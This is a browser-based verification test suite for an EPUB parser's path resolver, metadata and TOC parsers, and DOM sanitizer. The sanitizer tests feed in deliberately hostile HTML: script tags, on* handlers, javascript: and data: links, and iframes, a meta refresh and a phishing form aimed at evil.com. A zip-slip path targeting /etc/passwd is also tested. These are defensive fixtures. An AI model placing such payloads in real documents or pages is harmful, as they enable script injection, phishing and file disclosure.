/**
 * .agents/teamwork/m2_worker_2/verify_m2_r2.js
 * Comprehensive Verification Suite for Milestone 2 (Iteration 2 Remediation):
 * EPUB 2/3 Parser, Asset Extractor & Security Sandbox
 *
 * Runs in Node.js and headless Google Chrome against the local static HTTP server.
 * Verifies all standard Milestone 2 capabilities plus all Remediation Iteration 2 fixes:
 * 1. PathResolver: safe percent-decoded archive key matching across permutations.
 * 2. OpfParser: XML namespace prefix stripping and manifest/spine tag discovery in HTML5 mode.
 * 3. DOMSanitizer: Defense Layer 1 stripping of iframe, frame, frameset, zero on* attributes, form neutralization.
 */

const fs = require('node:fs');
const path = require('node:path');
const puppeteer = require('puppeteer-core');
const { startServer } = require('../../../test/server.js');
const { buildAllFixtures } = require('../../../test/test-fixtures/generate-fixtures.js');

const CHROME_PATH = process.env.CHROME_BIN || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const PROJECT_ROOT = path.resolve(__dirname, '../../..');

async function runVerification() {
  console.log('====================================================================');
  console.log('   Milestone 2 Remediation (Iteration 2) Comprehensive Verification  ');
  console.log('====================================================================');

  // 1. Ensure test fixtures are generated
  buildAllFixtures();

  // 2. Start static test server on dynamic port
  const { url: serverUrl, close: closeServer } = await startServer({ port: 0, autoPortFallback: true });
  console.log(`[verify_m2_r2] Test server running at ${serverUrl}`);

  // 3. Launch headless Google Chrome
  console.log(`[verify_m2_r2] Launching Chrome at: ${CHROME_PATH}`);
  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const page = await browser.newPage();

  // Listen to console errors in browser
  page.on('console', msg => {
    if (msg.type() === 'error') {
      console.log(`[browser-error] ${msg.text()}`);
    }
  });

  let allPassed = true;
  const testResults = [];

  function record(suite, name, passed, detail = '') {
    testResults.push({ suite, name, passed, detail });
    const mark = passed ? '✅ PASS' : '❌ FAIL';
    console.log(`  ${mark}: [${suite}] ${name}${detail ? ' (' + detail + ')' : ''}`);
    if (!passed) allPassed = false;
  }

  try {
    // Navigate to local index.html to establish origin & load vendor/jszip.min.js
    await page.goto(`${serverUrl}/index.html`, { waitUntil: 'domcontentloaded' });

    // Execute Test Suites inside the real browser environment
    const browserTests = await page.evaluate(async (serverUrl) => {
      const results = [];

      function assert(cond, msg) {
        if (!cond) throw new Error(msg);
      }

      // Dynamically import our ES modules
      const { PathResolver, findZipEntry } = await import('/js/parser/path-resolver.js');
      const { OpfParser, isImageItem, getMetaText, getAllMetaText, getNodeLocalName, findElementByLocal, findElementsByLocal } = await import('/js/parser/opf-parser.js');
      const { TocParser, splitHrefAnchor, sanitizeXmlEntities } = await import('/js/parser/toc-parser.js');
      const { AssetExtractor, DOMSanitizer, resolveMimeType } = await import('/js/parser/asset-extractor.js');
      const { EpubParser, validateZipMagicBytes } = await import('/js/parser/epub-parser.js');
      const { generateSampleEpub, SAMPLE_BOOK_METADATA } = await import('/js/sample-book.js');

      // -------------------------------------------------------------
      // SUITE A: PathResolver & Zip-Slip Defense
      // -------------------------------------------------------------
      try {
        // Normalization & Zip Slip Defense
        assert(PathResolver.normalizePath('OEBPS/text/ch01.xhtml') === 'OEBPS/text/ch01.xhtml', 'normal path failed');
        assert(PathResolver.normalizePath('OEBPS\\text\\ch01.xhtml') === 'OEBPS/text/ch01.xhtml', 'windows backslashes failed');
        assert(PathResolver.normalizePath('/OEBPS/ch1.xhtml') === 'OEBPS/ch1.xhtml', 'leading slash failed');
        assert(PathResolver.normalizePath('OEBPS/./ch1.xhtml') === 'OEBPS/ch1.xhtml', 'dot segment failed');
        assert(PathResolver.normalizePath('OEBPS/text/../images/cover.jpg') === 'OEBPS/images/cover.jpg', 'parent segment failed');
        // Zip-Slip attack: excessive ../ bounded at root
        assert(PathResolver.normalizePath('../../../../etc/passwd') === 'etc/passwd', 'zip slip defense failed');

        // getBaseDir
        assert(PathResolver.getBaseDir('OEBPS/content.opf') === 'OEBPS', 'getBaseDir OEBPS failed');
        assert(PathResolver.getBaseDir('OEBPS/text/ch01.xhtml') === 'OEBPS/text', 'getBaseDir OEBPS/text failed');
        assert(PathResolver.getBaseDir('content.opf') === '', 'getBaseDir root failed');

        // safeDecodeURIComponent
        assert(PathResolver.safeDecodeURIComponent('my%20file.xhtml') === 'my file.xhtml', 'decodeURI failed');
        assert(PathResolver.safeDecodeURIComponent('malformed%8.xhtml') === 'malformed%8.xhtml', 'malformed decodeURI failed');

        // splitUri
        const split = PathResolver.splitUri('text/ch01.xhtml?version=2#section-1');
        assert(split.path === 'text/ch01.xhtml', 'splitUri path failed');
        assert(split.query === 'version=2', 'splitUri query failed');
        assert(split.hash === 'section-1', 'splitUri hash failed');

        // resolvePath
        assert(PathResolver.resolvePath('OEBPS/content.opf', 'text/ch01.xhtml') === 'OEBPS/text/ch01.xhtml', 'resolvePath relative file failed');
        assert(PathResolver.resolvePath('OEBPS/text/ch01.xhtml', '../images/cover.jpg') === 'OEBPS/images/cover.jpg', 'resolvePath parent failed');
        assert(PathResolver.resolvePath('OEBPS', 'images/cover.svg', true) === 'OEBPS/images/cover.svg', 'resolvePath isDir failed');

        results.push({ suite: 'PathResolver', name: 'RFC 3986 Path Resolution & Zip-Slip Defense', passed: true });
      } catch (err) {
        results.push({ suite: 'PathResolver', name: 'RFC 3986 Path Resolution & Zip-Slip Defense', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE A2: Remediation 1 - findZipEntry Percent-Decoded Archive Key Matching
      // -------------------------------------------------------------
      try {
        const mockZip = new JSZip();
        mockZip.file('OEBPS/Images/Cover Photo%20(1).JPG', 'mock binary 1');
        mockZip.file('OEBPS/Images/Special%23Doc%20[Final].PNG', 'mock binary 2');
        mockZip.file('OEBPS\\Windows\\Style.css', 'mock css');
        mockZip.file('/OEBPS/Leading/Slash.txt', 'mock text');

        // 1. Decoded query matches literal percent-encoded archive key
        const entry1 = findZipEntry(mockZip, 'OEBPS/Images/Cover Photo (1).JPG');
        assert(entry1 !== null && entry1.name === 'OEBPS/Images/Cover Photo%20(1).JPG', 'decoded path failed to match percent key');

        // 2. Encoded query matches literal percent-encoded archive key
        const entry1b = findZipEntry(mockZip, 'OEBPS/Images/Cover%20Photo%20(1).JPG');
        assert(entry1b !== null, 'encoded path failed to match percent key');

        // 3. Lowercase query matches mixed-case percent-encoded key
        const entry1c = findZipEntry(mockZip, 'oebps/images/cover photo (1).jpg');
        assert(entry1c !== null, 'lowercase decoded path failed to match');

        // 4. Windows backslash key in zip matched via normalized forward-slash query
        const entryWin = findZipEntry(mockZip, 'OEBPS/Windows/Style.css');
        assert(entryWin !== null, 'windows backslash zip entry failed to match');

        // 5. Leading slash key in zip matched via clean normalized query
        const entryLead = findZipEntry(mockZip, 'OEBPS/Leading/Slash.txt');
        assert(entryLead !== null, 'leading slash zip entry failed to match');

        results.push({ suite: 'PathResolver', name: 'findZipEntry Percent-Decoded Key Matching (Remediation 1)', passed: true });
      } catch (err) {
        results.push({ suite: 'PathResolver', name: 'findZipEntry Percent-Decoded Key Matching (Remediation 1)', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE B: OpfParser (Standard + Remediation 2 HTML5 Prefix Splitting)
      // -------------------------------------------------------------
      try {
        const sampleOpfXml = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.openpackage.org/2007/opf" unique-identifier="pub-id" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="pub-id">urn:uuid:12345</dc:identifier>
    <dc:title>  Refactored Wisdom  </dc:title>
    <dc:creator>Alice Walker</dc:creator>
    <dc:creator>Bob Stone</dc:creator>
    <dc:language>en-US</dc:language>
    <dc:publisher>Antigravity Press</dc:publisher>
    <dc:date>2026-10-17</dc:date>
    <dc:description>A book on design.</dc:description>
    <meta name="cover" content="cov-item"/>
  </metadata>
  <manifest>
    <item id="cov-item" href="images/cov.png" media-type="image/png"/>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="ch1" href="text/ch1.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="ch1"/>
  </spine>
</package>`;

        const parsed = OpfParser.parseOpf(sampleOpfXml, 'OEBPS/content.opf');
        assert(parsed.metadata.title === 'Refactored Wisdom', 'trimmed title failed');
        assert(parsed.metadata.author === 'Alice Walker, Bob Stone', 'multiple creators failed');
        assert(parsed.metadata.language === 'en-US', 'language failed');
        assert(parsed.metadata.identifier === 'urn:uuid:12345', 'unique identifier failed');
        assert(parsed.manifest.size === 3, 'manifest item count failed');
        assert(parsed.spine.length === 1, 'spine count failed');
        assert(parsed.spine[0].isLinear === true, 'spine linear default failed');
        assert(parsed.coverItem !== null && parsed.coverItem.id === 'cov-item', 'cover cascade failed');

        // Test whitespace title fallback
        const emptyTitleXml = `<?xml version="1.0"?>
<package version="2.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>   </dc:title>
    <dc:creator></dc:creator>
  </metadata>
  <manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="c1"/></spine>
</package>`;
        const emptyParsed = OpfParser.parseOpf(emptyTitleXml, 'content.opf');
        assert(emptyParsed.metadata.title === 'Untitled Book', 'empty title fallback failed');
        assert(emptyParsed.metadata.author === 'Unknown Author', 'empty author fallback failed');

        // Remediation 2 Test A: Undeclared prefix triggers HTML5 DOM mode, must extract title/author
        const undeclaredPrefixOpf = `
<package>
  <metadata>
    <dc:title>Undeclared Prefix Book</dc:title>
    <dc:creator>Anonymous Author</dc:creator>
    <dc:creator>Second Author</dc:creator>
  </metadata>
  <manifest>
    <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="c1"/>
  </spine>
</package>`;
        const undeclaredParsed = OpfParser.parseOpf(undeclaredPrefixOpf, 'content.opf');
        assert(undeclaredParsed.metadata.title === 'Undeclared Prefix Book', 'Undeclared prefix title failed: ' + undeclaredParsed.metadata.title);
        assert(undeclaredParsed.metadata.author === 'Anonymous Author, Second Author', 'Undeclared prefix author failed: ' + undeclaredParsed.metadata.author);

        // Remediation 2 Test B: Fully opf-prefixed document in HTML5 mode with self-closing manifest items
        const prefixedOpf = `
<opf:package>
  <opf:metadata>
    <dc:title>Prefixed Structure Book</dc:title>
    <dc:creator>Prefix Writer</dc:creator>
  </opf:metadata>
  <opf:manifest>
    <opf:item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/>
    <opf:item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/>
    <opf:item id="c3" href="c3.xhtml" media-type="application/xhtml+xml"/>
  </opf:manifest>
  <opf:spine>
    <opf:itemref idref="c1"/>
    <opf:itemref idref="c2"/>
    <opf:itemref idref="c3"/>
  </opf:spine>
</opf:package>`;
        const prefixedParsed = OpfParser.parseOpf(prefixedOpf, 'content.opf');
        assert(prefixedParsed.metadata.title === 'Prefixed Structure Book', 'Prefixed title failed');
        assert(prefixedParsed.manifest.size === 3, 'HTML5 self-closing item nesting dropped items; expected 3, got: ' + prefixedParsed.manifest.size);
        assert(prefixedParsed.spine.length === 3, 'HTML5 self-closing itemref nesting dropped items; expected 3, got: ' + prefixedParsed.spine.length);

        results.push({ suite: 'OpfParser', name: 'OPF XML Metadata & HTML5 Prefix Traversal (Remediation 2)', passed: true });
      } catch (err) {
        results.push({ suite: 'OpfParser', name: 'OPF XML Metadata & HTML5 Prefix Traversal (Remediation 2)', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE C: TocParser
      // -------------------------------------------------------------
      try {
        // EPUB 3 Nav Document parsing with nested list and landmarks exclusion
        const navXml = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<body>
  <nav epub:type="landmarks" hidden=""><ol><li><a href="cov.xhtml">Cover</a></li></ol></nav>
  <nav epub:type="toc" id="toc" role="doc-toc">
    <h1>Contents</h1>
    <ol>
      <li>
        <a href="text/ch1.xhtml">Part One</a>
        <ol>
          <li><a href="text/ch1.xhtml#sec1">Chapter 1.1</a></li>
          <li><a href="text/ch1.xhtml#sec2">Chapter 1.2</a></li>
        </ol>
      </li>
      <li><a href="text/ch2.xhtml">Part Two</a></li>
    </ol>
  </nav>
</body>
</html>`;

        const toc = TocParser.parseNavDocument(navXml, 'OEBPS/nav.xhtml', {
          resolvePath: (base, rel) => PathResolver.resolvePath(base, rel)
        });

        assert(toc.length === 2, 'top level TOC length failed');
        assert(toc[0].title === 'Part One', 'toc title failed');
        assert(toc[0].fullPath === 'OEBPS/text/ch1.xhtml', 'toc fullPath failed');
        assert(toc[0].children.length === 2, 'toc nested children length failed');
        assert(toc[0].children[0].hash === 'sec1', 'toc hash extraction failed');
        assert(toc[0].children[0].fullPath === 'OEBPS/text/ch1.xhtml', 'toc child fullPath failed');

        // Test flatten & findItem
        const flattened = TocParser.flatten(toc);
        assert(flattened.length === 4, 'toc flatten failed');
        assert(flattened[1].depth === 1, 'toc depth failed');

        const foundExact = TocParser.findItem(toc, 'OEBPS/text/ch1.xhtml', 'sec2');
        assert(foundExact && foundExact.title === 'Chapter 1.2', 'findItem exact match failed');

        // EPUB 2 NCX Parsing with prefixed ncx:navPoint and bare &
        const ncxXml = `<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/">
  <navMap>
    <navPoint id="np1" playOrder="1">
      <navLabel><text>Science & Engineering</text></navLabel>
      <content src="text/science.xhtml"/>
      <navPoint id="np1-1" playOrder="2">
        <navLabel><text>Optics</text></navLabel>
        <content src="text/science.xhtml#optics"/>
      </navPoint>
    </navPoint>
  </navMap>
</ncx>`;

        const ncxToc = TocParser.parseNcxDocument(ncxXml, 'OEBPS/toc.ncx', {
          resolvePath: (base, rel) => PathResolver.resolvePath(base, rel)
        });

        assert(ncxToc.length === 1, 'ncx length failed');
        assert(ncxToc[0].title === 'Science & Engineering', 'ncx entity unescape failed');
        assert(ncxToc[0].children.length === 1, 'ncx nested failed');
        assert(ncxToc[0].children[0].hash === 'optics', 'ncx hash failed');

        results.push({ suite: 'TocParser', name: 'Dual EPUB 3 Nav Doc & EPUB 2 NCX Parsing', passed: true });
      } catch (err) {
        results.push({ suite: 'TocParser', name: 'Dual EPUB 3 Nav Doc & EPUB 2 NCX Parsing', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE D: AssetExtractor & DOM Sanitizer (Remediation 3)
      // -------------------------------------------------------------
      try {
        // Comprehensive Security Sanitization test (HTML and XHTML)
        const dirtyHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="5;url=http://evil.com">
  <base href="http://evil.com/">
  <script>window.pwned = true;</script>
</head>
<body onload="alert(1)">
  <img src="pic.jpg" onerror="alert(2)">
  <a href="javascript:alert(3)">Dangerous Link</a>
  <a href="data:text/html,<script>alert(4)</script>">Dangerous Data Link</a>
  <a href="vbscript:msgbox(5)">Dangerous VBScript Link</a>
  <a href="data:application/xhtml+xml,<script>alert(6)</script>">Dangerous XHTML Data Link</a>
  <iframe src="http://evil.com/frame.html"></iframe>
  <frameset><frame src="http://evil.com/frame2.html"></frameset>
  <object data="malware.swf"></object>
  <embed src="exploit.swf"></embed>
  <applet code="Malware.class"></applet>
  <form action="http://evil.com/phish" method="POST" target="_blank" onsubmit="alert('form')">
    <input type="text" name="data"/>
    <button type="submit" formaction="http://evil.com/override">Submit</button>
  </form>
  <div onclick="alert('click')" onmouseover="alert('hover')">Clean Text Content</div>
</body>
</html>`;

        const parser = new DOMParser();
        const doc = parser.parseFromString(dirtyHtml, 'text/html');
        DOMSanitizer.sanitize(doc);

        // Assert dangerous elements completely stripped
        assert(doc.querySelectorAll('script').length === 0, 'script not removed');
        assert(doc.querySelectorAll('meta[http-equiv="refresh"]').length === 0, 'meta refresh not removed');
        assert(doc.querySelectorAll('base').length === 0, 'base not removed');
        assert(doc.querySelectorAll('object').length === 0, 'object not removed');
        assert(doc.querySelectorAll('embed').length === 0, 'embed not removed');
        assert(doc.querySelectorAll('applet').length === 0, 'applet not removed');
        assert(doc.querySelectorAll('iframe').length === 0, 'iframe was not stripped');
        assert(doc.querySelectorAll('frame').length === 0, 'frame was not stripped');
        assert(doc.querySelectorAll('frameset').length === 0, 'frameset was not stripped');

        // Assert 100% inline on* event handlers stripped
        const elementsWithOn = Array.from(doc.querySelectorAll('*')).filter(el => {
          return Array.from(el.attributes).some(attr => attr.name.toLowerCase().startsWith('on'));
        });
        assert(elementsWithOn.length === 0, `Expected 0 inline on* handlers, found ${elementsWithOn.length}`);

        // Assert dangerous URI schemes neutralized
        const dangerousHrefs = Array.from(doc.querySelectorAll('a')).filter(a => {
          const href = (a.getAttribute('href') || '').toLowerCase();
          return href.startsWith('javascript:') || href.startsWith('vbscript:') || href.startsWith('data:text/html') || href.startsWith('data:application/xhtml');
        });
        assert(dangerousHrefs.length === 0, `Dangerous hrefs not removed: ${dangerousHrefs.length}`);

        // Assert form neutralization
        const form = doc.querySelector('form');
        assert(form !== null, 'form element should be preserved for styling');
        assert(!form.hasAttribute('action'), 'form action was not removed');
        assert(!form.hasAttribute('method'), 'form method was not removed');
        assert(!form.hasAttribute('target'), 'form target was not removed');
        assert(!form.hasAttribute('onsubmit'), 'form onsubmit was not stripped');

        const button = doc.querySelector('button');
        assert(button !== null, 'button element should be preserved');
        assert(!button.hasAttribute('formaction'), 'button formaction was not removed');

        // Also test AssetExtractor chapter preparation with hostile iframe in XHTML archive
        const testZip = new JSZip();
        testZip.file('OEBPS/text/test-sec.xhtml', `<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Sec Test</title></head>
<body>
  <iframe src="http://evil.com/embedded.html"></iframe>
  <div onmouseover="alert('div')">Safe Chapter Text</div>
</body>
</html>`);
        const extractor = new AssetExtractor(testZip);
        const chapterDoc = await extractor.getChapterDocument('OEBPS/text/test-sec.xhtml');
        assert(chapterDoc.querySelectorAll('iframe').length === 0, 'AssetExtractor.getChapterDocument failed to strip iframe');
        const chapterOnAttrs = Array.from(chapterDoc.querySelectorAll('*')).filter(el => {
          return Array.from(el.attributes).some(attr => attr.name.toLowerCase().startsWith('on'));
        });
        assert(chapterOnAttrs.length === 0, 'AssetExtractor.getChapterDocument failed to strip on* handler');
        extractor.cleanup();

        results.push({ suite: 'AssetExtractor', name: 'Security Sanitization & Defense Layer 1 (iframe, frame, form & on* handlers)', passed: true });
      } catch (err) {
        results.push({ suite: 'AssetExtractor', name: 'Security Sanitization & Defense Layer 1 (iframe, frame, form & on* handlers)', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE E: EpubParser against Test Fixtures
      // -------------------------------------------------------------
      // Test 1: valid-sample.epub
      try {
        const resp = await fetch('/test/test-fixtures/valid-sample.epub');
        const buffer = await resp.arrayBuffer();
        const parsed = await EpubParser.parse(buffer);

        assert(parsed.metadata.title === 'The Art of Minimalist Reading', 'valid-sample title failed');
        assert(parsed.metadata.author === 'Arthur Pendelton', 'valid-sample author failed');
        assert(parsed.spine.length === 3, 'valid-sample spine length failed');
        assert(parsed.coverBlobUrl !== null && parsed.coverBlobUrl.startsWith('blob:'), 'valid-sample coverBlobUrl failed');
        assert(parsed.toc.length >= 3, 'valid-sample toc length failed');

        // Test chapter DOM preparation
        const ch1Doc = await parsed.getChapterDocument(parsed.spine[0].fullPath);
        assert(ch1Doc !== null, 'getChapterDocument returned null');
        assert(ch1Doc.body.textContent.includes('Sanctuary'), 'chapter 1 content missing');

        // Check stylesheet rewrite
        const link = ch1Doc.querySelector('link[rel~="stylesheet"]');
        assert(link && link.getAttribute('href').startsWith('blob:'), 'stylesheet not rewritten to blob URL');

        // Verify cleanup
        parsed.cleanup();
        assert(parsed.assetMap.size === 0, 'cleanup did not clear assetMap');

        results.push({ suite: 'EpubParser', name: 'Parse valid-sample.epub & Chapter DOM Preparation', passed: true });
      } catch (err) {
        results.push({ suite: 'EpubParser', name: 'Parse valid-sample.epub & Chapter DOM Preparation', passed: false, detail: err.message });
      }

      // Test 2: empty-title.epub
      try {
        const resp = await fetch('/test/test-fixtures/empty-title.epub');
        const buffer = await resp.arrayBuffer();
        const parsed = await EpubParser.parse(buffer);

        assert(parsed.metadata.title === 'Untitled Book', 'empty-title fallback failed');
        assert(parsed.metadata.author === 'Unknown Author', 'empty-author fallback failed');
        assert(parsed.coverBlobUrl === null, 'empty-title cover should be null');
        assert(parsed.spine.length === 1, 'empty-title spine length failed');
        assert(parsed.spine[0].isLinear === true, 'empty-title linear default failed');

        parsed.cleanup();
        results.push({ suite: 'EpubParser', name: 'Parse empty-title.epub (Graceful Fallbacks)', passed: true });
      } catch (err) {
        results.push({ suite: 'EpubParser', name: 'Parse empty-title.epub (Graceful Fallbacks)', passed: false, detail: err.message });
      }

      // Test 3: corrupted.epub
      try {
        const resp = await fetch('/test/test-fixtures/corrupted.epub');
        const buffer = await resp.arrayBuffer();
        let rejected = false;
        try {
          await EpubParser.parse(buffer);
        } catch (err) {
          rejected = true;
          assert(err.message.includes('not a valid ZIP archive'), 'rejection message mismatch: ' + err.message);
        }
        assert(rejected, 'corrupted.epub was not rejected');
        results.push({ suite: 'EpubParser', name: 'Reject corrupted.epub (Fast Magic-Byte Validation)', passed: true });
      } catch (err) {
        results.push({ suite: 'EpubParser', name: 'Reject corrupted.epub (Fast Magic-Byte Validation)', passed: false, detail: err.message });
      }

      // -------------------------------------------------------------
      // SUITE F: Programmatic sample-book-001 from js/sample-book.js
      // -------------------------------------------------------------
      try {
        const sampleResult = await generateSampleEpub();
        const sampleBookBlob = sampleResult.blob;
        assert(sampleBookBlob instanceof Blob, 'sampleBookBlob not instance of Blob');

        const parsed = await EpubParser.parse(sampleBookBlob);
        assert(parsed.metadata.title === SAMPLE_BOOK_METADATA.title, 'sample book title mismatch');
        assert(parsed.metadata.author === SAMPLE_BOOK_METADATA.author, 'sample book author mismatch');
        assert(parsed.spine.length === 4, 'sample book spine count mismatch, expected 4, got ' + parsed.spine.length);
        assert(parsed.coverBlobUrl !== null && parsed.coverBlobUrl.startsWith('blob:'), 'sample book cover missing');

        // Check TOC entries (10 hierarchical entries)
        const flatToc = TocParser.flatten(parsed.toc);
        assert(flatToc.length === 10, 'sample book should have 10 TOC entries, got: ' + flatToc.length);

        // Check getChapterDocument for all spine items
        for (let i = 0; i < parsed.spine.length; i++) {
          const doc = await parsed.getChapterDocument(parsed.spine[i].fullPath);
          assert(doc && doc.body, 'chapter doc body missing for ' + parsed.spine[i].fullPath);
        }

        // Test cleanup
        parsed.cleanup();
        assert(parsed.assetMap.size === 0, 'sample book cleanup failed');

        results.push({ suite: 'SampleBook', name: 'Parse Programmatic sample-book-001 with 10 TOC entries', passed: true });
      } catch (err) {
        results.push({ suite: 'SampleBook', name: 'Parse Programmatic sample-book-001 with 10 TOC entries', passed: false, detail: err.message });
      }

      return results;
    }, serverUrl);

    // Record all results from browser
    for (const r of browserTests) {
      record(r.suite, r.name, r.passed, r.detail);
    }

  } finally {
    await browser.close();
    await closeServer();
  }

  console.log('====================================================================');
  console.log(`Execution Summary: ${testResults.filter(t => t.passed).length} / ${testResults.length} passed.`);
  if (!allPassed) {
    console.error('FAILED: Some verification tests did not pass!');
    process.exit(1);
  } else {
    console.log('SUCCESS: All Milestone 2 Remediation tests PASSED flawlessly!');
  }
}

runVerification().catch(err => {
  console.error('Fatal error in verify_m2_r2:', err);
  process.exit(1);
});
